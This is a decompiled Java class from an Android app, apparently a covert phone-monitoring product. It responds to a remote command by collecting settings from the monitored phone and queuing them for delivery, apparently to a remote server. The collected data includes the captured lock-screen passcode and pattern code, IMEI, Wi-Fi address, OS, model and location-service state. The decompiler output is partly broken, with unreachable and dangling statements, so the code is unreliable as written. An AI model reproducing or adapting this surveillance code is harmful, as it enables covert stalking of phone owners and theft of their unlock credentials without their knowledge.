package com.vvt.appengine.a;

import android.content.Context;
import android.location.LocationManager;
import android.os.Build;
import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.DeviceSettingId;
import com.vvt.c.c;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.io.r;
import com.vvt.phoenix.prot.command.data.j;
import com.vvt.phoenix.prot.command.z;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.ShellUtil.SELinuxMode;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Locale;

public class ba
{
  private static final boolean a = com.vvt.ak.a.a;
  private ConditionVariable b;
  private com.vvt.datadeliverymanager.a.a c;
  private RmtCtrlOutputStatusMessage d;
  private ControlCommand e;
  
  public ba(ControlCommand paramControlCommand)
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.d = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = c();
    this.c = ((com.vvt.datadeliverymanager.a.a)localObject);
    this.e = paramControlCommand;
  }
  
  private boolean a(Context paramContext)
  {
    Object localObject = Locale.getDefault();
    localObject = DateFormat.getTimeInstance(1, (Locale)localObject);
    boolean bool = localObject instanceof SimpleDateFormat;
    if (bool)
    {
      localObject = ((SimpleDateFormat)localObject).toPattern();
      int i = 72;
      int j = ((String)localObject).indexOf(i);
      if (j >= 0) {
        localObject = "24";
      }
    }
    for (;;)
    {
      return ((String)localObject).equals("24");
      localObject = "12";
      continue;
      localObject = "12";
    }
  }
  
  private z b(AppEngine1 paramh)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Context localContext = paramh.a();
    z localz = new com/vvt/phoenix/prot/command/z;
    localz.<init>();
    Object localObject1 = (ArrayList)this.e.getData();
    Iterator localIterator = ((ArrayList)localObject1).iterator();
    Object localObject5;
    label1707:
    do
    {
      do
      {
        do
        {
          for (;;)
          {
            bool1 = localIterator.hasNext();
            if (!bool1) {
              break label1908;
            }
            localObject1 = (String)localIterator.next();
            boolean bool2 = a;
            if (bool2) {}
            localObject2 = DeviceSettingId.GENERAL_PASSCODELOCK_ISPASSCODEON;
            bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
            if (bool2)
            {
              localObject2 = paramh.X;
              if (localObject2 != null)
              {
                localObject2 = paramh.X;
                bool2 = ((com.vvt.capture.d.a.a)localObject2).f();
                bool5 = a;
                if (bool5) {}
                localObject4 = paramh.X;
                bool5 = ((com.vvt.capture.d.a.a)localObject4).g();
                boolean bool6 = a;
                if (bool6) {}
                localObject5 = new com/vvt/phoenix/prot/command/data/j;
                ((j)localObject5).<init>();
                ((j)localObject5).a((String)localObject1);
                if ((bool2) || (bool5)) {}
                for (localObject1 = "1";; localObject1 = "0")
                {
                  ((j)localObject5).b((String)localObject1);
                  localz.a((j)localObject5);
                  break;
                }
              }
            }
            else
            {
              localObject2 = DeviceSettingId.GENERAL_PASSCODELOCK_PASSCODE;
              bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
              if (bool2)
              {
                localObject2 = paramh.W;
                if (localObject2 != null)
                {
                  localObject2 = paramh.W.g();
                  bool5 = a;
                  if (bool5) {}
                  bool5 = com.vvt.ag.b.a((String)localObject2);
                  if (!bool5)
                  {
                    localObject4 = new com/vvt/phoenix/prot/command/data/j;
                    ((j)localObject4).<init>();
                    ((j)localObject4).a((String)localObject1);
                    ((j)localObject4).b((String)localObject2);
                    localz.a((j)localObject4);
                  }
                }
              }
              else
              {
                localObject2 = DeviceSettingId.GENERAL_PASSCODELOCK_PATTERNCODE;
                bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                if (bool2)
                {
                  localObject2 = paramh.X;
                  if (localObject2 != null)
                  {
                    localObject2 = paramh.X;
                    bool2 = ((com.vvt.capture.d.a.a)localObject2).g();
                    if (bool2)
                    {
                      localObject2 = paramh.X.h();
                      bool5 = a;
                      if (bool5) {}
                      bool5 = com.vvt.ag.b.a((String)localObject2);
                      if (!bool5)
                      {
                        localObject4 = new com/vvt/phoenix/prot/command/data/j;
                        ((j)localObject4).<init>();
                        ((j)localObject4).a((String)localObject1);
                        ((j)localObject4).b((String)localObject2);
                        localz.a((j)localObject4);
                      }
                    }
                  }
                }
                else
                {
                  localObject2 = DeviceSettingId.GENERAL_DATETIME_IS24HRSFORMAT;
                  bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                  if (bool2)
                  {
                    localObject2 = new com/vvt/phoenix/prot/command/data/j;
                    ((j)localObject2).<init>();
                    ((j)localObject2).a((String)localObject1);
                    localObject1 = "0";
                    ((j)localObject2).b((String)localObject1);
                    bool1 = a(localContext);
                    if (bool1)
                    {
                      localObject1 = "1";
                      ((j)localObject2).b((String)localObject1);
                    }
                    localz.a((j)localObject2);
                  }
                  else
                  {
                    localObject2 = DeviceSettingId.GENERAL_USAGE_TOTALSTORAGE;
                    bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                    if (bool2)
                    {
                      localObject2 = new com/vvt/phoenix/prot/command/data/j;
                      ((j)localObject2).<init>();
                      ((j)localObject2).a((String)localObject1);
                      localObject1 = r.a();
                      ((j)localObject2).b((String)localObject1);
                      localz.a((j)localObject2);
                    }
                    else
                    {
                      localObject2 = DeviceSettingId.GENERAL_USAGE_AVAILABLE;
                      bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                      if (bool2)
                      {
                        localObject2 = new com/vvt/phoenix/prot/command/data/j;
                        ((j)localObject2).<init>();
                        ((j)localObject2).a((String)localObject1);
                        localObject1 = r.b();
                        ((j)localObject2).b((String)localObject1);
                        localz.a((j)localObject2);
                      }
                      else
                      {
                        localObject2 = DeviceSettingId.GENERAL_USAGE_BATTERY;
                        bool2 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                        if (bool2)
                        {
                          localObject2 = paramh.E;
                          int j = ((c)localObject2).b();
                          bool5 = a;
                          if (bool5) {}
                          localObject4 = new com/vvt/phoenix/prot/command/data/j;
                          ((j)localObject4).<init>();
                          ((j)localObject4).a((String)localObject1);
                          localObject1 = Integer.toString(j);
                          ((j)localObject4).b((String)localObject1);
                          localz.a((j)localObject4);
                        }
                        else
                        {
                          localObject2 = DeviceSettingId.GENERAL_ABOUT_NAME;
                          boolean bool3 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                          if (bool3)
                          {
                            localObject2 = new com/vvt/phoenix/prot/command/data/j;
                            ((j)localObject2).<init>();
                            ((j)localObject2).a((String)localObject1);
                            localObject1 = b();
                            ((j)localObject2).b((String)localObject1);
                            localz.a((j)localObject2);
                          }
                          else
                          {
                            localObject2 = DeviceSettingId.GENERAL_ABOUT_NETWORK;
                            bool3 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                            if (bool3)
                            {
                              localObject2 = paramh.l.c();
                              if (localObject2 != null)
                              {
                                localObject2 = paramh.l.c();
                                int k = ((String)localObject2).length();
                                if (k >= i) {}
                              }
                              else
                              {
                                localObject2 = paramh.l;
                                localObject4 = paramh.b();
                                ((com.vvt.phoneinfo.b)localObject2).a(localContext, (String)localObject4);
                              }
                              localObject2 = paramh.l.c();
                              bool5 = a;
                              if (bool5) {}
                              localObject4 = new com/vvt/phoenix/prot/command/data/j;
                              ((j)localObject4).<init>();
                              ((j)localObject4).a((String)localObject1);
                              ((j)localObject4).b((String)localObject2);
                              localz.a((j)localObject4);
                            }
                            else
                            {
                              localObject2 = DeviceSettingId.GENERAL_ABOUT_CAPACITY;
                              bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                              if (bool4)
                              {
                                localObject2 = r.d();
                                bool5 = a;
                                if (bool5) {}
                                localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                ((j)localObject4).<init>();
                                ((j)localObject4).a((String)localObject1);
                                ((j)localObject4).b((String)localObject2);
                                localz.a((j)localObject4);
                              }
                              else
                              {
                                localObject2 = DeviceSettingId.GENERAL_ABOUT_AVAILABLE;
                                bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                if (bool4)
                                {
                                  localObject2 = r.c();
                                  bool5 = a;
                                  if (bool5) {}
                                  localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                  ((j)localObject4).<init>();
                                  ((j)localObject4).a((String)localObject1);
                                  ((j)localObject4).b((String)localObject2);
                                  localz.a((j)localObject4);
                                }
                                else
                                {
                                  localObject2 = DeviceSettingId.GENERAL_ABOUT_OSVERSION;
                                  bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                  if (bool4)
                                  {
                                    localObject2 = new com/vvt/phoenix/prot/command/data/j;
                                    ((j)localObject2).<init>();
                                    ((j)localObject2).a((String)localObject1);
                                    localObject1 = paramh.l.h();
                                    ((j)localObject2).b((String)localObject1);
                                    localz.a((j)localObject2);
                                  }
                                  else
                                  {
                                    localObject2 = DeviceSettingId.GENERAL_ABOUT_CARRIER;
                                    bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                    if (!bool4)
                                    {
                                      localObject2 = DeviceSettingId.GENERAL_ABOUT_MODEL;
                                      bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                      if (bool4)
                                      {
                                        localObject2 = paramh.l.g();
                                        bool5 = a;
                                        if (bool5) {}
                                        localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                        ((j)localObject4).<init>();
                                        ((j)localObject4).a((String)localObject1);
                                        ((j)localObject4).b((String)localObject2);
                                        localz.a((j)localObject4);
                                      }
                                      else
                                      {
                                        localObject2 = DeviceSettingId.GENERAL_ABOUT_SERIALNUMBER;
                                        bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                        if (!bool4)
                                        {
                                          localObject2 = DeviceSettingId.GENERAL_ABOUT_WIFIADDRESS;
                                          bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                          if (bool4)
                                          {
                                            localObject2 = com.vvt.z.a.c(localContext);
                                            bool5 = a;
                                            if (bool5) {}
                                            localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                            ((j)localObject4).<init>();
                                            ((j)localObject4).a((String)localObject1);
                                            ((j)localObject4).b((String)localObject2);
                                            localz.a((j)localObject4);
                                          }
                                          else
                                          {
                                            localObject2 = DeviceSettingId.GENERAL_ABOUT_BLUETOOTH;
                                            bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                            if (!bool4)
                                            {
                                              localObject2 = DeviceSettingId.GENERAL_ABOUT_IMEI;
                                              bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                              if (bool4)
                                              {
                                                localObject2 = paramh.l.d();
                                                bool5 = a;
                                                if (bool5) {}
                                                localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                                ((j)localObject4).<init>();
                                                ((j)localObject4).a((String)localObject1);
                                                ((j)localObject4).b((String)localObject2);
                                                localz.a((j)localObject4);
                                              }
                                              else
                                              {
                                                localObject2 = DeviceSettingId.GENERAL_ABOUT_MACADDRESS;
                                                bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                                if (!bool4)
                                                {
                                                  localObject2 = DeviceSettingId.GENERAL_ABOUT_PROCESSOR;
                                                  bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                                  if (bool4)
                                                  {
                                                    localObject2 = Build.CPU_ABI;
                                                    bool5 = a;
                                                    if (bool5) {}
                                                    bool5 = a;
                                                    if (bool5) {}
                                                    bool5 = com.vvt.aa.a.g();
                                                    if (bool5)
                                                    {
                                                      localObject4 = new java/lang/StringBuilder;
                                                      ((StringBuilder)localObject4).<init>();
                                                      localObject5 = "(x64) ";
                                                      localObject4 = ((StringBuilder)localObject4).append((String)localObject5);
                                                      localObject2 = (String)localObject2;
                                                    }
                                                    localObject4 = new com/vvt/phoenix/prot/command/data/j;
                                                    ((j)localObject4).<init>();
                                                    ((j)localObject4).a((String)localObject1);
                                                    ((j)localObject4).b((String)localObject2);
                                                    localz.a((j)localObject4);
                                                  }
                                                  else
                                                  {
                                                    localObject2 = DeviceSettingId.GENERAL_ABOUT_RAM;
                                                    bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
                                                    if (!bool4) {
                                                      break;
                                                    }
                                                    long l1 = com.vvt.aa.b.c(localContext);
                                                    long l2 = 0L;
                                                    bool4 = l1 < l2;
                                                    if (bool4)
                                                    {
                                                      localObject2 = new com/vvt/phoenix/prot/command/data/j;
                                                      ((j)localObject2).<init>();
                                                      ((j)localObject2).a((String)localObject1);
                                                      localObject4 = new Object[i];
                                                      localObject5 = Long.valueOf(l1);
                                                      localObject4[0] = localObject5;
                                                      localObject1 = String.format("%d MB", (Object[])localObject4);
                                                      ((j)localObject2).b((String)localObject1);
                                                      localz.a((j)localObject2);
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
          localObject2 = DeviceSettingId.GENERAL_ABOUT_SELINUX_MODE;
          bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
          if (bool4)
          {
            bool5 = com.vvt.ad.a.a();
            localObject2 = "Not Available";
            if (bool5)
            {
              localObject4 = ShellUtil.d();
              if (localObject4 != null)
              {
                localObject5 = ShellUtil.SELinuxMode.UNKNOWN;
                if (localObject4 != localObject5)
                {
                  localObject5 = ShellUtil.SELinuxMode.ENFORCING;
                  if (localObject4 != localObject5) {
                    break label1707;
                  }
                  localObject2 = "Enforcing";
                }
              }
            }
            for (;;)
            {
              localObject4 = new com/vvt/phoenix/prot/command/data/j;
              ((j)localObject4).<init>();
              ((j)localObject4).a((String)localObject1);
              ((j)localObject4).b((String)localObject2);
              localz.a((j)localObject4);
              break;
              localObject5 = ShellUtil.SELinuxMode.PERMISSIVE;
              if (localObject4 == localObject5) {
                localObject2 = "Permissive";
              }
            }
          }
          localObject2 = DeviceSettingId.GENERAL_ABOUT_SYSTEMTYPE;
          bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
        } while (bool4);
        localObject2 = DeviceSettingId.GENERAL_ABOUT_COMPUTERDOMAIN;
        bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
      } while (bool4);
      localObject2 = DeviceSettingId.PRIVACY_LOCATIONSERVICE_ISLOCATIONSERVICEON;
      bool4 = ((DeviceSettingId)localObject2).equals((String)localObject1);
    } while (!bool4);
    Object localObject2 = (LocationManager)localContext.getSystemService("location");
    Object localObject4 = "gps";
    for (;;)
    {
      try
      {
        bool5 = ((LocationManager)localObject2).isProviderEnabled((String)localObject4);
        localObject5 = "network";
      }
      catch (Exception localException1)
      {
        try
        {
          bool4 = ((LocationManager)localObject2).isProviderEnabled((String)localObject5);
          localObject5 = new com/vvt/phoenix/prot/command/data/j;
          ((j)localObject5).<init>();
          ((j)localObject5).a((String)localObject1);
          if ((!bool5) && (!bool4)) {
            break label1894;
          }
          localObject1 = "1";
          ((j)localObject5).b((String)localObject1);
          localz.a((j)localObject5);
        }
        catch (Exception localException2)
        {
          for (;;)
          {
            Object localObject3;
            bool4 = bool5;
          }
        }
        localException1 = localException1;
        bool4 = false;
        localObject3 = null;
      }
      bool5 = bool4;
      bool4 = false;
      localObject3 = null;
      continue;
      label1894:
      localObject1 = "0";
      ((j)localObject5).b((String)localObject1);
    }
    label1908:
    bool1 = a;
    if (bool1) {}
    return localz;
  }
  
  private String b()
  {
    String str1 = null;
    boolean bool = ShellUtil.c();
    if (bool) {
      str2 = "settings get system device_name";
    }
    try
    {
      str1 = KMShell.a(str2);
    }
    catch (Exception localException)
    {
      for (;;) {}
    }
    String str2 = com.vvt.ag.b.b(str1);
    bool = com.vvt.ag.b.c(str2);
    if (bool) {
      str1 = com.vvt.aa.b.a();
    }
    bool = a;
    if (bool) {}
    return str1;
  }
  
  private com.vvt.datadeliverymanager.a.a c()
  {
    bb localbb = new com/vvt/appengine/a/bb;
    localbb.<init>(this);
    return localbb;
  }
  
  public RmtCtrlOutputStatusMessage a(AppEngine1 paramh)
  {
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = new android/os/ConditionVariable;
      com.vvt.datadeliverymanager.h localh = null;
      ((ConditionVariable)localObject1).<init>(false);
      this.b = ((ConditionVariable)localObject1);
      localObject1 = b(paramh);
      localh = new com/vvt/datadeliverymanager/h;
      localh.<init>();
      int j = 46;
      localh.a(j);
      localh.a((com.vvt.phoenix.prot.command.b)localObject1);
      localObject1 = DeliveryRequestType.REQUEST_TYPE_NEW;
      localh.a((DeliveryRequestType)localObject1);
      localObject1 = PriorityRequest.PRIORITY_NORMAL;
      localh.a((PriorityRequest)localObject1);
      localObject1 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
      localh.a((DataProviderType)localObject1);
      int i = 15;
      localh.c(i);
      long l = 60000L;
      localh.b(l);
      i = 1;
      localh.c(i);
      boolean bool2 = true;
      localh.b(bool2);
      localObject1 = this.c;
      localh.a((com.vvt.datadeliverymanager.a.a)localObject1);
      localObject1 = paramh.g;
      ((com.vvt.datadeliverymanager.b)localObject1).a(localh);
      bool2 = a;
      if (bool2) {}
      localObject1 = this.b;
      ((ConditionVariable)localObject1).block();
      bool2 = a;
      if (bool2) {}
      localObject1 = this.d;
      return (RmtCtrlOutputStatusMessage)localObject1;
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/ba.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */